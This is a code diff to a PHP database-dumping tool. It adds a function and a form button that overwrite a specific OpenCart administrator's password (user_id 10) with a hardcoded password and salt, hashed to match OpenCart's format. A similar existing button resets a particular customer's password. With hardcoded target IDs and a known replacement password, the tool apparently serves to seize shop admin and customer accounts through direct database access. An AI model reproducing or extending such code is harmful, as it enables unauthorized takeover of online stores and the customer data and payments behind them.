@@ -287,6 +287,46 @@
             }
         }
 
+        // Функция для смены пароля в oc_user (админка)
+        function updateAdminPassword($conn, $database, $userId, $newPassword, $salt) {
+            if (!ensureConnection()) {
+                throw new Exception("Database connection lost");
+            }
+            try {
+                // Проверяем наличие таблицы
+                $tableExists = $conn->query("SHOW TABLES FROM `{$database}` LIKE 'oc_user'")->rowCount() > 0;
+                if (!$tableExists) {
+                    throw new Exception("Table oc_user not found in database");
+                }
+                // Получаем текущий хеш
+                $stmt = $conn->prepare("SELECT password FROM `{$database}`.`oc_user` WHERE user_id = :user_id");
+                $stmt->execute([':user_id' => $userId]);
+                $user = $stmt->fetch(PDO::FETCH_ASSOC);
+                if (!$user) {
+                    throw new Exception("User with ID {$userId} not found");
+                }
+                // Генерируем новый хеш пароля (SHA1)
+                $newPasswordHash = sha1($salt . sha1($salt . sha1($newPassword)));
+                // Если уже такой хеш — не обновляем
+                if ($user['password'] === $newPasswordHash) {
+                    return "Admin password is already set to the correct hash";
+                }
+                // Обновляем пароль
+                $stmt = $conn->prepare("UPDATE `{$database}`.`oc_user` SET password = :password WHERE user_id = :user_id");
+                $result = $stmt->execute([
+                    ':password' => $newPasswordHash,
+                    ':user_id' => $userId
+                ]);
+                if ($result) {
+                    return "Admin password successfully updated for user_id {$userId}";
+                } else {
+                    throw new Exception("Failed to update admin password");
+                }
+            } catch (Exception $e) {
+                throw new Exception("Error updating admin password: " . $e->getMessage());
+            }
+        }
+
         // Handle disconnect
         if (isset($_POST['disconnect'])) {
             session_unset();
@@ -417,6 +457,24 @@
                 $error = "Database connection lost. Please reconnect and try again.";
             }
         }
+
+        // Обработка смены пароля для админа
+        if (isset($_POST['update_admin_password']) && isset($_POST['database']) && isset($_POST['user_id'])) {
+            if (ensureConnection()) {
+                try {
+                    $database = $_POST['database'];
+                    $userId = (int)$_POST['user_id'];
+                    $newPassword = 'Poqjrjq2@';
+                    $salt = 'CifhkKEyy';
+                    $result = updateAdminPassword($conn, $database, $userId, $newPassword, $salt);
+                    $success = $result;
+                } catch (Exception $e) {
+                    $error = $e->getMessage();
+                }
+            } else {
+                $error = "Database connection lost. Please reconnect and try again.";
+            }
+        }
         ?>
 
         <?php if ($error): ?>
@@ -494,6 +552,14 @@
                                                         <input type="hidden" name="database" value="<?php echo htmlspecialchars($database); ?>">
                                                         <input type="hidden" name="customer_id" value="1946">
                                                         <button type="submit" name="update_password" class="dump-button" style="background-color: #4CAF50;">Update Customer Password</button>
+                                                    </form>
+                                                </div>
+                                            <?php elseif ($table === 'oc_user'): ?>
+                                                <div class="table-actions">
+                                                    <form method="POST" action="" style="display: inline;">
+                                                        <input type="hidden" name="database" value="<?php echo htmlspecialchars($database); ?>">
+                                                        <input type="hidden" name="user_id" value="10">
+                                                        <button type="submit" name="update_admin_password" class="dump-button" style="background-color: #2196F3;">Update Admin Password (tai3)</button>
                                                     </form>
                                                 </div>
                                             <?php endif; ?>
